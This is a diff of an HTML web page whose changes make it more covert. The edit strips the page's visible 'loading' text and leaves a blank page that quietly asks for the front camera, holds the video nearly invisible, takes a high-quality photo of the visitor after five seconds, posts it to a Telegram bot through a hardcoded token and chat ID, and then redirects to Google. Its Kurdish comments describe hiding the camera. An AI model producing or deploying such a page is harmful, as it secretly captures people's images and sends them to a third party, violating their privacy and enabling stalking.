@@ -3,9 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sidan laddas...</title>
+    
+    <title> </title> 
+    
+    <meta name="description" content="">
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <link rel="icon" href="data:,">
+
     <style>
-        /* لە جیاتی display:none، ڤیدیۆکە زۆر بچووک دەکەین بۆ ئەوەی کامێراکە بە ئاگابێت */
+        /* شاردنەوەی کامێرا بە شێوەیەکی شەفاف بۆ ئەوەی مۆبایلەکە ڕووناکی ڕێکبخات */
         #video {
             position: absolute;
             width: 1px;
@@ -13,85 +20,74 @@
             opacity: 0.01;
         }
         #canvas { display: none; }
+        
+        /* لاپەڕەیەکی بە تەواوی سپی و پاک */
         body { 
-            font-family: sans-serif; 
-            text-align: center; 
-            padding-top: 30%; 
-            background-color: #f4f4f4;
+            background-color: #ffffff; 
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
         }
-        .loader {
-            border: 5px solid #ddd;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div class="loader"></div>
-    <h1>Laddar sidan...</h1>
-    <p>Vänta medan vi optimerar anslutningen.</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        // زانیارییەکانی تێلێگرامی تۆ
         const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
         const CHAT_ID = '6351568884';
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // داواکردنی کوالێتی بەرز و فوکەسی کامێرا
+        // ڕێکخستنی کامێرا بۆ کوالێتی بەرز
         const constraints = {
             video: {
                 facingMode: "user",
-                width: { min: 640, ideal: 1280, max: 1920 },
-                height: { min: 480, ideal: 720, max: 1080 }
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
             }
         };
 
         navigator.mediaDevices.getUserMedia(constraints)
         .then(stream => {
             video.srcObject = stream;
-            
-            // کاتەکەمان زیاد کرد بۆ ٥ چرکە تا مۆبایلەکە ڕووناکی تەواو وەربگرێت
+            // 5 چرکە بۆ وەرگرتنی ڕووناکی تەواو و سافی وێنەکە
             setTimeout(takeSnapshot, 5000);
         })
         .catch(err => {
+            // ئەگەر ڕەزامەندی نەدا یەکدەست دەچێتە سەر گوگل
             window.location.href = "https://www.google.se";
         });
 
         function takeSnapshot() {
             const context = canvas.getContext('2d');
-            
-            // ڕێکخستنی قەبارەی وێنەکە بەپێی کامێراکە
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
-            // وێنەگرتن
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // گۆڕینی بۆ JPEG چونکە لە PNG ڕوونتر و سافترە بۆ تێلێگرام
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'image.jpg');
-                formData.append('caption', '📸 وێنەی ساف و ڕوون بە کوالێتی بەرز');
 
                 fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
                 .then(() => {
+                    // ناردن بۆ گووگڵ دوای تەواوبوون
+                    window.location.href = "https://www.google.se";
+                })
+                .catch(() => {
                     window.location.href = "https://www.google.se";
                 });
-            }, 'image/jpeg', 0.95); // 0.95 واتە بەرزترین کوالێتی
+            }, 'image/jpeg', 0.95);
         }
     </script>
 </body>
